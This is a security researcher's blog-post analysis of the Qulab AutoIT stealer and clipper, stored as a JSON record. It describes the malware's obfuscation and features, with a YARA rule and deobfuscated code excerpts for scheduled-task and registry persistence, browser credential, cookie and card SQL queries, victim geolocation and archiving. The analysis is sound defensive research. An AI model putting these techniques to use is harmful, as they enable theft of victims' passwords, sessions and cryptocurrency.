{
    "id": "99e07bbf-a488-4783-b370-f4372160b12b",
    "created_at": "2023-01-12T15:06:23.699905Z",
    "updated_at": "2025-03-27T02:16:26.053088Z",
    "deleted_at": null,
    "sha1_hash": "b7b42ab80142732b80c8f8fc2ab9881ec1fb437e",
    "title": "2019-03-25 - Let‚Äôs play with Qulab, an exotic malware developed in AutoIT",
    "authors": "",
    "file_creation_date": "2022-05-28T01:21:21Z",
    "file_modification_date": "2022-05-28T01:21:21Z",
    "file_size": 2891561,
    "plain_text": "# Let‚Äôs play with Qulab, an exotic malware developed in AutoIT\n\n**[fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/](https://fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/)**\n\nfumko March 25, 2019\n\nAfter some issues that kept me far away from my researches, it‚Äôs time to put my hands again\non some sympathetic stuff. This one is technically and finally my real first post of the year\n(The anti-VM one was a particular case).\n\nSo today, we will dig into Qulab Stealer + Clipper, another password-stealer that had my\nattention to be (on my point view) an exotic one, because it is fully developed in AutoIT and\nhave a really cool obfuscation technique that occupied me for some times. Trends to have\nmalware that is coded in some languages different than C, C++, .NET or Delphi is not new,\n[there is a perfect case with the article made by Hasherezade earlier this year for](https://twitter.com/hasherezade) a stealer\ndeveloped in GoLang (that I highly recommend taking a look on it).\n\nNormally, using AutoIT scripts in that area is pretty common. It‚Äôs widely used as a packer for\nhiding detection or as a node into an infection chain, but as a whole password-stealer, it‚Äôs not\nthe same. I could say it‚Äôs a particular case because it‚Äôs resale with support on the black\nmarket.\n\nEven if as usual, techniques remains the same for the stealing features, it‚Äôs always\nentertaining to see how there is plenty of ways to achieve one simple goal. Also, the\nversatility on this one is what makes me overwhelmed my curiosity and burning all my sleep\ntime for some reasons‚Ä¶\n\nQulab is focusing on these features:\n\nBrowser stealing\n\n\n-----\n\nWallet Clipper\nFTP creds\nDiscord / Telegram logs\nSteam (Session / Trade links / 2FA Authenticator by abusing a third party software)\nTelegram Bot through a proxy\nGrabber\n\n## Auto IT?\n\nAs I mentioned in the intro, Qulab is coded in AutoIT, for people that are really not in touch it\nor have no idea about it, it is an automation language who has a syntax similar to the BASIC\nstructure, it‚Äôs designed to work only on Microsoft Windows.\n\nThey are two way to execute AutoIT scripts :\n\nIf the script is run with the .au3 format, AutoIT dependances are required and all the\nlibraries that are necessary to run it.\nIf the script is compiled all the libraries are added into it for avoiding dependances. It\nmeans that you don‚Äôt need to install AutoIT for executing PE.\n\nWhen the instructions are compiled into an executable file, it‚Äôs easy to catch if we are\nanalyzing an AutoIT script by a simply checking some strings, so there already some Yara\nrules that made the task to confirm that is the case.\n\n\n-----\n\n```\nrule AutoIt\n{\n     meta:\n          author = \"_pusher_\"\n          date = \"2016-07\"\n          description = \"www.autoitscript.com/site/autoit/\"\n     strings:\n          $aa0 = \"AutoIt has detected the stack has become corrupt.\\n\\nStack\ncorruption typically occurs when either the wrong calling convention is used or when\nthe function is called with the wrong number of arguments.\\n\\nAutoIt supports the\n__stdcall (WINAPI) and __cdecl calling conventions. The __stdcall (WINAPI)\nconvention is used by default but __cdecl can be used instead. See the DllCall()\ndocumentation for details on changing the calling convention.\" wide ascii nocase\n          $aa1 = \"AutoIt Error\" wide ascii nocase\n          $aa2 = \"Missing right bracket ')' in expression.\" wide ascii nocase\n          $aa3 = \"Missing operator in expression.\" wide ascii nocase\n          $aa4 = \"Unbalanced brackets in expression.\" wide ascii nocase\n          $aa5 = \"Error parsing function call.\" wide ascii nocase\n          $aa6 = \">>>AUTOIT NO CMDEXECUTE<<<\" wide ascii nocase\n          $aa7 = \"#requireadmin\" wide ascii nocase\n          $aa8 = \"#OnAutoItStartRegister\" wide ascii nocase\n          $aa9 = \"#notrayicon\" wide ascii nocase\n          $aa10 = \"Cannot parse #include\" wide ascii nocase\n     condition:\n          5 of ($aa*)\n}\n\n```\nOn my side, I will not explain the steps or tools to extract the code, they are plenty of tutorials\non the internet for explaining how it‚Äôs possible to extract some AutoIt scripts. The idea here is\nto focus mainly on the malware, not on the extracting part‚Ä¶\n\n## Code Obfuscation\n\nAfter extracting the code from the PE, it‚Äôs easy to guess that some amazing stuff is coming to\nour eyes by just looking the amount of code‚Ä¶ The analysis of this malware will be some kind\nof challenge.\n```\ncat Qulab.au3 | wc -l\n21952 // some pain incomming\n\n```\nThe source code is really (really) obfuscated but not hard to clean it. it takes just quite some\ntimes with the help of homemade scripts to surpass it. But as an analyst that wants to have\ninformation, a simple dump of the process during the execution and the report a sandbox is\n\n\n-----\n\nsufficient to understand the main tasks.\n\n[For non-technical people, I have created a dedicated page on GitHub for being able to read](https://github.com/Fmk0/work/tree/master/AutoIT)\nand learn easily the AutoIT fundamentals. I highly recommend to open it during the reading\nof this article, it will be easier. you had also to read the official AutoIT FAQ for understanding\nthe API. Unfortunately, it‚Äôs not complete as the Microsoft MSDN documentation but it‚Äôs\nenough about the basic principles of this language‚Ä¶\n\nIt‚Äôs impossible to explain all form of obfuscation in this malware, but this is a summary of the\nmain tricks.\n\nVariable & Function Naming convention\n\nAll variables except few exceptions are in that form\n```\n\\$A\\d[A-F0-9]{3,10}\n\n```\nIt‚Äôs wonderful to see over ten thousand (and more) variables like this into the whole script\n(sarcasm)\n```\n$A18A4000F15\n$A5AA4204E10\n$A0FA4403A33\n$A55A4601801\n$A24A4804C5C\n...\n\n```\nGarbage conditions\n\nWhen there is an obfuscated code, there is obviously a huge amount of nonsense conditions\nor unused functions. It doesn‚Äôt take a long time to get the idea on Qulab because they are\neasily catchable by pure logic, take an example on this one :\n```\nFUNC A5D10600720(BYREF $A37E6C01A00,$A183A702F3C)\n  IF NOT ISDECLARED(\"SSA5D10600720\") THEN\n  ENDIF\n  ...\n  ...\nENDFUNC\n\n```\n\n-----\n\nThis a classical pattern, the condition is just checking if a variable ( SS + Function Name) is\nnot declared, inside there is always some local variables that are initiated for purposes of the\nfunctions and most of the time they are coming from the master array. By deobfuscating\nthem, the whole conditions on this pattern can be removed variables are switched by their\ncorresponding values, it permits to delete a lot of codes.\n\nUnused Functions\n\nAnother classy scheme is to find some unused functions, and this permit to clean effectively\nthousands of lines of junk code by creating a script for the purposes or using some Userdefined functions made by the AutoIT community.\n\nInitiating Variables and using them\n```\nGLOBAL LOCAL $VARIABLE_1 = FUNC1(ARRAY[POS])\n...Code....\nGLOBAL LOCAL $VARIABLE_455 = $VARIABLE_1\n...Code...\nGLOBAL LOCAL $VARIABLE_9331 = VARIABLE_455 <- Final Value\n\n```\n- Initiating them by a condition\n```\nIF $A4A7AC0550A=DEFAULT THEN $A4A7AC0550A=-NUMBER($A198A005329)\nIF $A2F7AD03E54=DEFAULT THEN $A2F7AD03E54=-NUMBER($A2C8A10261F)\nIF $A3D7AE0071E=DEFAULT THEN $A3D7AE0071E=-NUMBER($A218A202B4D)\nIF $A3F7AF01354=DEFAULT THEN $A3F7AF01354=-NUMBER($A2A8A300E5F)\n\n```\n- Using count variable into a 2D Array, with a value that is stored inside a 20 000 length\narray.\n```\n$A31E5E11A1F[NUMBER($A2646512725)][NUMBER($A0C46615D39)]+=NUMBER($A5246713208)\n\n```\n\n-----\n\n- Hiding code error integers by a mixture of multiple functions and variables.\n```\nRETURN SETERROR($A2C07504A0A,NUMBER($A411740414D),NUMBER($A6017502D45))\n\n## Code Execution\n\n```\nThis malware has an unorthodox way to execute code and it‚Äôs pretty cool.\n\n1. Read the directives, follow them to go to the main function\n2. The main function will set up the master array (I will explain this later)\n3. When this function is done, the script will go again to the beginning by a purely logical\n\nway after the directives, and search for Global variables and instructions, for our case,\nit will be some global variables.\n4. When all of the Global Variables have been initiated, it will skip all the functions\n\nbecause they are simply not called (for the moment), and will try to reach some\nexploitable instruction (as I explained above).\n\nWhen finally some code is reachable, a domino effect occurs, an initiated variable will\ncall one function, that inside it will call one or multiple functions, and so on.\n5. During the same process, there is also some encoded files that are hardcoded into the\n\ncode and injected into the code for some specific tasks. When every setup tasks are\ndone, it‚Äôs entering into an infinite loop for specific purposes.\n\nIn the end, it could be schematized like this.\n\n\n-----\n\n## Directives are leading the road path\n\nEverything that is starting with ‚Äò#‚Äô is a directive, this is technically the first thing that the script\nwill check, and here, it‚Äôs configured to go to a specific function at all cost that is\n‚ÄúA5300003647_‚Äù, this one is the main function.\n```\n#–°–™–ï–ë–ò–°–¨ –û–¢–°–Æ–ë–î–ê –î–£–î–ê –¢–´ –°–°–ê–ù–ê–Ø –ë–õ–Ø–•–ê –ú–£–•–ê\n#NoTrayIcon\n#OnAutoItStartRegister \"A5300003647_\"\n\n```\n[#NoTrayIcon ‚Äì Hide the AutoIT icon on the tray task](https://autohotkey.com/docs/commands/_NoTrayIcon.htm)\n[#OnAutoItStartRegister ‚Äì The first function that will be called at the beginning of the script](http://lampiweb.com/help/autoit/html/keywords/OnAutoItStartRegister.htm)\n(an equivalent of the main function)\n\n## The Main function is VIP\n\nThe first function of Qulab is critical because this is where almost all the data is initialized for\nthe tasks. The variable $DLIT is storing a ‚Äúhuge‚Äù string that will be split with the delimiter\n‚Äúo2B2Ct‚Äù and stored into the array $OS\n\n\n-----\n\nNote: the name mentioned here is the one that will be used for this stealer script, results may\nvary between samples but the idea remains the same.\n```\nFUNC A5300003647_()\n FOR $AX0X0XA=1 TO 5\n  LOCAL $DLIT=\"203020o2B2Ct203120o...\" \n  GLOBAL $A5300003647,$OS=STRINGSPLIT($DLIT,\"o2B2Ct\",1)\n  IF ISARRAY($OS) AND $OS[0]>=19965 THEN EXITLOOP\n  SLEEP(10)\n  NEXT\nENDFUNC\n\n## Global Variables are the keys\n\n```\nGlobal Variables are certainly the main focus of Qulab, they are nowhere and everywhere,\nthey are so impactful with the master array that a single modification of one Variable can\nhave a domino effect for the whole malware that could end to a segmentation fault or\nanything else that could crash the script.\n\nWhen a variable is initialized, there are multiple steps behind it :\n\n1. Selecting a specific value from the master array\n2. Converting the value to a string\n3. Profit\n```\nGLOBAL $A1D7450311E=A5300003647($OS[1])\n\n```\nthe function ‚ÄúA5300003647‚Äù is, in fact, an equivalent of ‚ÄúFrom Hex‚Äù feature, and it‚Äôs\nconverting 2 bytes by 2 bytes the values.\n```\nFUNC A5300003647($A5300003647)\n LOCAL $A5300003647_\n FOR $X=1 TO STRINGLEN($A5300003647) STEP 2\n  $A5300003647_&=CHR(DEC(STRINGMID($A5300003647,$X,2)))\n  NEXT\n RETURN $A5300003647_\nENDFUNC\n\n```\n\n-----\n\nBy just tweaking the instructions of the AutoIT scripts, with the help of some adjustments\n(thanks homemade deobfuscate scripts and patience), variables are now almost fully\nreadable.\n\nAfter modifying our 19966 variables (that‚Äôs a lot), we can see clearly most of the tasks that\nthe malware has on the pipe statically. this doesn‚Äôt mean that is done with this part, It‚Äôs only a\nfirst draft and it needs to be cleaned again because there is a lot of unfinished tasks and of\ncourse as I explained above, most of them are unused.\n\n## Main code\n\nAfter all that mess to understand what is the correct path to read the code, the script is now\nentering into the core step, The more serious business begins right now.\n\n\n-----\n\nTo summarize all the task, this is briefly what‚Äôs going on :\n\nSetting up, Variables that are configured in the builder\n\nName of the payload\nName of the schedule task\nName of the schedule task folder\nname of the hidden AppData folder where the malware will do the tasks\nWallets\nHide itself\nDo all the stealing tasks\nDecoding & load dependances when it‚Äôs required\nMake the persistence\nAnd more‚Ä¶ üôÇ\n\n## Where is the exit?\n\nBetween two functions there is sometimes global variables that declared or there are also\nsneaky calls that have an impact into the payload itself. They could not be really seen at a\nfirst view, because they are drowned into an amount of code. So 1 or 2 lines between dozens\nof functions could be easily forgettable.\n\n\n-----\n\nwe can see that is also indicating the specific method that will be called at the end of\neverything.\n```\nONAUTOITEXITREGISTER(\"A1AA3F04218\")\n\n```\nSo with just small research, we can see our function that will be called at the end of the script\nbetween a huge amount of spaghetti code.\n\nIts in fact, closing [crypt32.dll module, thats is used for the CryptoAPI.](https://docs.microsoft.com/en-us/windows/desktop/seccrypto/crypt32-dll-versions)\n```\nGLOBAL $A1A48943E37=DLLOPEN(\"crypt32.dll\")\n\n## Some curiosities to disclose\n\n Homemade functions or already made?\n\n```\n\n-----\n\nFor most of the tasks, the malware is using a lot of User Defined Functions (UDF) with\nsome tweaks, as explained on the AutoIT FAQ: ‚ÄúThese libraries have been written to allow\n_easy integration into your own scripts and are a very valuable resource for any programmer‚Äù._\nit confirms more and more that open-source code and programming forums are useful for\nboth sides (good & bad), so for developing malware it doesn‚Äôt require to be a wizard,\neverything is at disposition and free.\n\nAlso for Qulab, it‚Äôs confirmed that he used tweaked or original UDF for :\n\nSQL content\nArchiving content\nTelegram API\nWindows API\nMemory usage\n\n## Memory optimization\n\nAutoIT programs are known to be greedy in memory consumption and could be probably a\nrisk to be more detectable. At multiple time, the malware will do a task to check if there is a\npossibility to reduce the amount of allocated memory, by removing as much as possible,\npages from the working set of the process. The manipulation required to\nuse [EmptyWorkingSet and could permit to reduce by half the memory usage of the program.](https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-emptyworkingset)\n```\nFUNC A0E64003F0C($A1B85D1000C=0)\n  IF NOT $A1B85D1000C THEN $A1B85D1000C=EXECUTE(\" @AutoItPID \")\n  LOCAL $A3485F11D1D=DLLCALL(\"kernel32.dll\",\"handle\",\"OpenProcess\",\"dword\",\n(($A209DF54B2B<1536)?1280:4352),\"bool\",0\"dword\",$A1B85D1000C)\n  IF @ERROR OR NOT $A3485F11D1D[0] THEN RETURN SETERROR(@ERROR+20,@EXTENDED,0)\n  LOCAL $A5F55F1392E=DLLCALL(EXECUTE(\" @SystemDir\n\")&\"\\psapi.dll\",\"bool\",\"EmptyWorkingSet\",\"handle\",$A3485F11D1D[0])\n  RETURN 1\nENDFUNC\n\n```\nFirst, it will grab the PID value of the AutoIT-compiled program by executing the macro\n[@AutoItPID, then opening it with OpenProcess. But one of the argument is quite obscure](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)\n```\n(($A209DF54B2B<1536)?1280:4352)\n\n```\nwhat is behind variable $A209DF54B2B? let‚Äôs dig into it‚Ä¶\n\n\n-----\n\n```\nGLOBAL CONST $A209DF54B2B=A2054F01A5F()\nFUNC A2054F01A5F()\n  LOCAL $A1656715F1D=DLLSTRUCTCREATE(\"struct;dword OSVersionInfoSize;dword\nMajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar\nCSDVersion[128];endstruct\")\n  DLLSTRUCTSETDATA($A1656715F1D,1,DLLSTRUCTGETSIZE($A1656715F1D))\n  LOCAL\n$A5F55F1392E=DLLCALL(\"kernel32.dll\",\"bool\",\"GetVersionExW\",\"struct*\",$A1656715F1D)\n  IF @ERROR ORNOT$A5F55F1392E[0] THENRETURNSETERROR(@ERROR,@EXTENDED,0)\n  RETURN\nBITOR(BITSHIFT(DLLSTRUCTGETDATA($A1656715F1D,2),-8),DLLSTRUCTGETDATA($A1656715F1D,3)))\nENDFUNC\n\n```\nThis is WinAPI function will retrieve the version of the current operating system used on the\nmachine, the value returned is into a binary format. So if we look back and check with the\nofficial API.\n```\n//\n// _WIN32_WINNT version constants\n//\n#define _WIN32_WINNT_NT4      0x0400 // Windows NT 4.0\n#define _WIN32_WINNT_WIN2K     0x0500 // Windows 2000\n#define _WIN32_WINNT_WINXP     0x0501 // Windows XP\n#define _WIN32_WINNT_WS03      0x0502 // Windows Server 2003\n#define _WIN32_WINNT_WIN6      0x0600 // Windows Vista\n#define _WIN32_WINNT_VISTA     0x0600 // Windows Vista\n#define _WIN32_WINNT_WS08      0x0600 // Windows Server 2008\n#define _WIN32_WINNT_LONGHORN    0x0600 // Windows Vista\n#define _WIN32_WINNT_WIN7      0x0601 // Windows 7\n#define _WIN32_WINNT_WIN8      0x0602 // Windows 8\n#define _WIN32_WINNT_WINBLUE    0x0603 // Windows 8.1\n#define _WIN32_WINNT_WINTHRESHOLD  0x0A00 // Windows 10\n#define _WIN32_WINNT_WIN10     0x0A00 // Windows 10\n\n```\nWith knowing the Windows Version with this function, the AutoIT script is now able to open\nthe process correctly and analyzing it. The last task is to purge the unused working set by\ncalling EmptyWorkingSet for cleaning some unnecessary memory.\n\n## Task scheduling\n\n\n-----\n\nTask scheduling with stealers is summarized with one line of code, a simple and effective\nShellExecute command with schtask.exe to execute periodically something, as a persistence\n[trick. Here it‚Äôs a little bit more advanced than usual, in multiple points by using a TaskService](https://docs.microsoft.com/en-us/windows/desktop/taskschd/taskservice)\nObject\n```\n$A60FD553516=OBJCREATE(\"Schedule.Service\")\n$A60FD553516.Connect()\n\n```\nThe new task is set with a flag value of 0, as explained in the MSDN Documentation, it‚Äôs a\nmandatory value.\n```\n$A489E853A1E=$A60FD553516.NewTask(0)\n\n```\nTo be less detectable, some tricks as being done to look like legit as possible by detailing\nthat the process has been made by the correct user, the description, the name of the task\nand the task folder is adjusted by what the customer wants.\n```\n$A4A9E951E11=$A489E853A1E.RegistrationInfo()\n$A4A9E951E11.Description()= $A487E851D38\n$A4A9E951E11.Author()=EXECUTE(\" @LogonDomain \")&\"\\\"&EXECUTE(\" @UserName \")\n\n```\nAfter some other required values to be configured that is not really necessary to talk, it‚Äôs way\nmore interesting to talk about the setting part of this Task Service because it is quite\ninteresting.\n\nTo maximize the yield, Qulab tweaks the service whenever the situation :\n\nThe laptop is not on charge\nThe battery is low\nNetwork available or not\n\nIn the end, every minute, the task manager will run the task by executing the malware into\nthe hidden repository folder in %APPDATA%.\n\n\n-----\n\n```\n$A4B9EA50562=$A489E853A1E.Settings()\n$A4B9EA50562.MultipleInstances() = 0\n$A4B9EA50562.DisallowStartIfOnBatteries()= FALSE\n$A4B9EA50562.StopIfGoingOnBatteries()= FALSE\n$A4B9EA50562.AllowHardTerminate()= TRUE\n$A4B9EA50562.StartWhenAvailable()= TRUE\n$A4B9EA50562.RunOnlyIfNetworkAvailable() FALSE\n$A4B9EA50562.Enabled()= TRUE\n$A4B9EA50562.Hidden()= TRUE\n$A4B9EA50562.RunOnlyIfIdle()= FALSE\n$A4B9EA50562.WakeToRun()= TRUE\n$A4B9EA50562.ExecutionTimeLimit()= \"PT1M\" // Default PT99999H\n$A4B9EA50562.Priority()= 3 // Default 5\n$A3E9EB51B0D=$A489E853A1E.Principal()\n$A3E9EB51B0D.Id()=EXECUTE(\" @UserName \")\n$A3E9EB51B0D.DisplayName()=EXECUTE(\" @UserName \")\n$A3E9EB51B0D.LogonType()=$A0B8E352D04\n$A3E9EB51B0D.RunLevel()= 0\n\n## Another Persistence?\n\n```\nA classic one is used\n```\nIF NOT A3F64500C0D($A00DEB51215,$A35DEF51B61) THEN \nREGWRITE(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\n     $A00DEB51215,\"REG_SZ\",\"\"\"\"&$A104A053309&\"\\\"&$A60DE955B5F&\"\"\"\")\n\n```\nThere is nothing much to say more, about this part‚Ä¶\n\n## Encoding is not encryption\n\nWhen I was digging into the code, I found a mistake that makes me laugh a little‚Ä¶ The\nclassical quote for saying that base64 is encryption. So maybe after this in-depth analysis,\nthe malware developer will fix his mistake (or just insulting me :‚Äô) )\n\n\n-----\n\n## Malware Features\n\n Clipper\n\nIf you are unfamiliar with what is a clipper, it‚Äôs in fact really simple‚Ä¶ The idea is to alter\nsomething that is in the clipboard content with the help of some filters/rules that is most of\nthe cases simplify as regular expressions. If it matches with something, it will modify the\namount of data caught with something else that was configured. It‚Äôs heavily used for\nswapping crypto wallet IDs from the victim to the attacker one. This is also the case with\nQulab, it‚Äôs focusing on Wallets & Steam trade links.\n\nThis piece of code represent the core of the clipper :\n\n\n-----\n\nSo that are the steps:\n\n1. Execute a script for checking if there any new data to send for the attacker\n2. Checking if the ongoing task is present on the task scheduler.\n3. Cleaning unnecessary Working Set (see the memory optimization explained above)\n4. Make a pause in the loop for 200 ms\n5. Get the content of the clipboard with CLIPGET\n6. Check all the wallet, if it matches, substitute with the wished value.\n\n1. Put the modified content on the Clipboard with CLIPPUT\n2. Repeat\n\nAll the values from the different wallet that the attacker wants to swap are stored at the\nbeginning of the code section. By pure speculations, I‚Äôm considering that are the values that\nare configured in the builder.\n\n\n-----\n\nCurrent List of Cryptocurrency Wallet that the stealer is switching.\n\nBitcoin Bitcoin Cash Bitcoin Gold Bytecoin\n\nCardano Lisk Dash Doge\n\nElectronium Ethereum Graft Litecoin\n\nMonero Neo QIWI Qtum\n\nSteam Trade Link Stratis VIA WME\n\nWMR WMU WMX WMZ\n\nWaves Yandex Money ZCash\n\n## Browser Stealer\n\nQulab is some kind of a puzzle with multiple pieces and each piece is also another puzzle.\nCollectings and sorting them to solve the entire fresco is some kind of a challenge. I can\nadmit for the browser part, even if the concept is easy and will remain always the same (for\n\n\n-----\n\nthe fundamentals of a Password Stealer), the way that it was implemented is somewhat\nclever.\n\nAt first, every browser that is supported by the malware is checked in turn, with specific\narguments :\n\nThe Browser path\nThe files that the stealer wants to grab with ‚Äú|‚Äù as a delimiter\nThe Name of the browser\n\nIt goes to a very important function that will search (not only for the browser), these kinds of\nfiles :\n\nwallet.dat\nLogin Data\nformhistory.sqlite\nWeb Data\ncookies.sqlite\nCookies\n.maFile\n\nIf they are matching, it enters into a loop that will save the path entry and storing it into one\nmaster variable with ‚Äú|‚Äù as a delimiter for every important file.\n\n\n-----\n\nWhen all the files are found, it only needs to do some regular expression to filter and split the\ndata that the malware and to grab.\n\nAfter inspecting and storing data from browsers that are present in the list, serious business\nis now on the pipe‚Ä¶ One of the binaries that are hardcoded in base64 is finally decoded and\nused to get some juicy data and like every time it‚Äôs the popular SQLite3.dll that was inside all\nof this.\n\n\n-----\n\nSomething interesting to notice is that the developer made some adjustment with the official\nAutoIT FUD For SQLite3 and removed all the network tasks, for avoiding downloading the\nlibraries (32 or 64 bits) and of course be less detectable.\n\nThe file is saved into the %ROAMING% directory, and will have the name :\n\nPE_Name + ‚Äú.sqlite3.module.dll‚Äù\n\nThe routine remains the same for each time this library is required :\n\n[1. Checking with a patched _SQLite_GetTable2d, the SQL Statement that needs to be](https://www.autoitscript.com/autoit3/docs/libfunctions/_SQLite_GetTable2d.htm)\n\nexecuted & tested is a valid one.\n\n\n-----\n\n2. The SQL Table is put into a loop and each iteration of the array is verified by a specific\n\nregular expression.\n3. If the content is found, it enters into another condition that will simply add them into the\n\nlist of files & information that will be pushed in the malicious archive.\n\nIn the end, these requests are executed on browser files.\n```\nSELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM\ncredit_cards;\nSELECT username_value, password_value, origin_url, action_url FROM logins;\nselect host, 'FALSE' as flag, path, case when isSecure = 1 then 'TRUE' else 'FALSE'\nend as secure, expiry, name, value from moz_cookies;\nselect host_key, 'FALSE' as flag, path, case when is_secure = 1 then 'TRUE' else\n'FALSE' end as secure, expires_utc, name, encrypted_value from cookies;\n\n### Current List of supported browsers\n\n```\n\n360 Browser Amigo AVAST\nBrowser\n\n\nBlisk Breaker\nBrowser\n\n\nChromium Chromodo CocCoc CometNetwork\nBrowser\n\n\nComodo\nDragon\n\n\nCyberFox Flock Browser Ghost\nBrowser\n\n\nGoogle Chrome IceCat\n\nNETGATE Browser Opera\n\n\nIceDragon K-Meleon\nBrowser\n\n\nMozilla\nFirefox\n\n\nOrbitum\nBrowser\n\n\nPale Moon QIP Surf SeaMonkey Torch\n\n\nUCBrowser uCOZ Media Vivaldi Waterfox Yandex\nBrowser\n\n## FTP\n\nThe FTP is rudimentary but is doing the task, as far than it looks, it‚Äôs only targeting FileZilla\nsoftware.\n\n## Grabber\n\n\n-----\n\nQulab doesn‚Äôt have an advanced Grabber feature, it‚Äôs really simplistic compared to stealers\nlike Vidar. It simplifies by just one simple line‚Ä¶ It‚Äôs using the same function as explained\nabove with the browsers, with the only difference, it‚Äôs focusing on searching specific file\nformat on the desktop directory\n\nTargeted files are\n\n.txt\n.maFile\nwallet.dat\n\n## Wallet\n\nNothing to say more than Exodus is mainly targeted.\n\n## Discord\n\nDiscord is more and more popular nowadays, so it‚Äôs daily routine now to see this software\ntargeted by almost all the current password-stealer on the market.\n\n## Steam & Steam Desktop Authenticator\n\nThe routine for Steam is almost identical to the one that I explained in Predator and will\nremain the same until Steam will change some stuff into the security of his files (or just\nchanging the convention name of them).\n\n1. Finding the Steam path into the registry\n2. searching the config folder\n3. searching recursively into it for grabbing all the ssfn files\n\n\n-----\n\nBut! There is something different on this Password-stealer than all the other that I‚Äôve seen\ncurrently. Its also targeting [Steam Desktop Authenticator a Third-party software as explained](https://github.com/Jessecar96/SteamDesktopAuthenticator)\non the official page as a desktop implementation of Steam‚Äôs mobile authenticator app. It‚Äôs\nsearching for a specific and unique file ‚Äú.maFile‚Äù, it‚Äôs already mentioned above in the\nGrabber part and The Browser Stealing part. This file contains sensitive data of the steam\naccount linked with the Steam mobile authenticator app.\n\nSo this malware is heavily targeting Steam :\n\nClipping Steam Trade Links\nStealing steam sessions\nStealing 2FA main file from a Third-Party software.\n\n## Information log\n\nIt‚Äôs a common thing with stealer to have an information file that logs important data from the\nvictim‚Äôs machine. It‚Äôs also the case on Qulab, it‚Äôs not necessary to explain all the part, I‚Äôm just\nexplaining here simply with which command it was able to do get the pieces of information.\n\nOS Version @OSVersion\n\nOS Architecture @OSArch\n\nOS Build @OSBuild\n\nUsername @UserName\n\nComputer Name @ComputerName\n\nProcessor ExecQuery(‚ÄúSELECT * FROM Win32_VideoController‚Äù,‚ÄùWQL‚Äù,16+32)\n\nVideo Card ExecQuery(‚ÄúSELECT * FROM Win32_Processor‚Äù,‚ÄùWQL‚Äù,16+32)\n\nMemory STRINGFORMAT(‚Äú%.2f Gb‚Äù,MEMGETSTATS()[1]/1024/1024)\n\n\n-----\n\nKeyboard Layout\nID\n\n\n@KBLayout\n\n\nResolution @DesktopWidth & @DesktopHeight & @DesktopDepth &\n@DesktopRefresh\n\nNetwork\n\nNot seen due to the proxy, there is a network request done on ipapi.co for getting all the\nnetwork information of the victim‚Äôs machine.\n```\n$A4AC5512B62=INETREAD(\"https://ipapi.co/json\",3)\n\n```\nThe JSON result is consolidated into one variable and saved for the final log file.\n```\nIF STRINGLEN($A4AC5512B62) > 75 THEN\n  $A2B1F55481F=A4604603206(BINARYTOSTRING($A4AC5512B62))\n  $A280FD53C4B =\" - IP: \" &A211460135A($A2B1F55481F,\"[ip]\") & EXECUTE(\" @CRLF \")\n        &\" - Country: \" &A211460135A($A2B1F55481F,\"[country_name]\") &\nEXECUTE(\" @CRLF \")\n        &\" - City: \" &A211460135A($A2B1F55481F,\"[city]\") & EXECUTE(\" @CRLF \")\n        &\" - Region: \" &A211460135A($A2B1F55481F,\"[region]\") & EXECUTE(\"\n@CRLF \")\n        &\" - ZipCode: \" &A211460135A($A2B1F55481F,\"[postal]\") & EXECUTE(\"\n@CRLF \")\n        &\" - ISP: \" &A211460135A($A2B1F55481F,\"[org]\") & EXECUTE(\" @CRLF \")\n        &\" - Coordinates: \" &A211460135A($A2B1F55481F,\"[latitude]\")&\",\n\"&A211460135A($A2B1F55481F,\"[longitude]\")&EXECUTE(\" @CRLF \")\n        &\" - UTC: \" &A211460135A($A2B1F55481F,\"[utc_offset]\")&\"\n(\"&A211460135A($A2B1F55481F,\"[timezone]\")&\")\"\nENDIF\n\n```\nSofts\n```\n$A12EF151C00=A5944E0550E(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\nFOR $A51E7205400 = 1 TO $A12EF151C00[0][0]\n  $A3B1F954B63 &=\" - \"&$A12EF151C00[$A51E7205400][0]&EXECUTE(\" @CRLF \")\nNEXT\n\n```\n\n-----\n\nProcess List\n\nBecause AutoIT is based for doing automation task script, almost all the basic commands\nfrom the WinAPI are already integrated, so by simply using the ProcessList() call, the list of\nall the processes are stored into an array.\n```\n$A2EEFA54E30=PROCESSLIST()\nFOR $A51E7205400=1 TO $A2EEFA54E30[0][0]\n  $A481FB54A60&=\" - \"&$A2EEFA54E30[$A51E7205400][0]&\" / PID:\n\"&$A2EEFA54E30[$A51E7205400][1]&EXECUTE(\" @CRLF \")\nNEXT\n\n```\nBy mixing all this data, the log file is finally done:\n```\n# /===============================\\\n# |=== QULAB CLIPPER + STEALER ===|\n# |===============================|\n# |==== BUY CLIPPER + STEALER ====|\n# |=== http://teleg.run/QulabZ ===|\n# \\===============================/\nDate: XX.XX.2019, HH:MM:SS\nMain Information:\n- ...\nOther Information:\n- ...\nSoft / Windows Components / Windows Updates:\n- ...\nProcess List:\n- ...\n\n## Instructions log\n\n```\nFor probably helping his customers when the malware is catching data from specific software\nother than browsers, an additional file is added to give some explanations to fulfill the task\nentirely after the stealing process, step by step and stores into ‚Äú–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è\n–ø–æ —É—Å—Ç–∞–Ω–æ–≤–∫–µ.txt‚Äù\n\n\n-----\n\nInstructions are unique for each of these :\n\nExodus\nDiscord\nWallets\nSteam\nFilezilla\nTelegram\nSteam Desktop Authentication\nGrabber part\n\n## Archive Setup\n\nWhen finally everything is done on the stealing tasks, the folder is now ready to be archived,\nand it‚Äôs using another encoded payload hardcoded into the script. It‚Äôs not really complicated\nto understand here it‚Äôs 7zip behind this huge amount of code.\n\nThe payload is saved into the folder repository on %APPDATA% with the name of PE_Name\n+ ‚Äú.module.dll‚Äù and executing a specific task before deleting everything.\n```\nARCHIVATE($A271F153721)\nRUNWAIT($A271F153721&\" a -y -mx9 -ssw \"\"\"&$A104A053309&\"\\\"&$A63CEC52907&\".7z\"\"\n\"\"\"&$A104A053309&\"\\1\\*\"\"\",\"\",EXECUTE(\" @SW_HIDE \"))\nFILEDELETE($A271F153721)\n\n```\nIf you don‚Äôt understand the command, they are explained here :\n\na Add\n\ny yes on all queries\n\nmx9 Ultra Compression 